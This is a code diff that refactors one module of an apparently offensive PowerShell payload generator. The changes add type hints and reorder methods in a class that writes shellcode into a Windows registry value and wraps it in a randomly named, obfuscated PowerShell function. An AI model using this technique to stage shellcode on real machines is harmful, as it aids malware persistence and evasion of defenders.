@@ -5,7 +5,7 @@ from ps1.utils.formatters import *
 
 class regkey:
 
-    def __init__(self, shellcode, arguments):
+    def __init__(self, shellcode: str | bytes | list[str], arguments: dict) -> None:
         self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))
         if 'path' in arguments:
             self.path = arguments['path']
@@ -23,11 +23,16 @@ class regkey:
         elif self.type == 'bytes':
             print(f'Set-ItemProperty -Path "{self.path}" -Name "{self.key}" -Type Binary -Value {','.join([f'0x{shellcode[i]:02x}' for i in range(0, len(shellcode))])}')
 
-    def imports(self):
+    def imports(self) -> list[str]:
         return []
 
-    def codeblock(self):
+    def compilerOptions(self) -> list[str]:
+        return []
 
+    def transformer(self, shellcodestring: str) -> str:
+        return shellcodestring.format(shellcode=f'{self.name}')
+
+    def codeblock(self) -> str:
         return f"""
 
 function {self.name} {{
@@ -35,9 +40,3 @@ function {self.name} {{
     return $obfuscated;
 }}
 """
-
-    def compilerOptions(self):
-        return []
-
-    def transformer(self, shellcodestring):
-        return shellcodestring.format(shellcode=f'{self.name}')
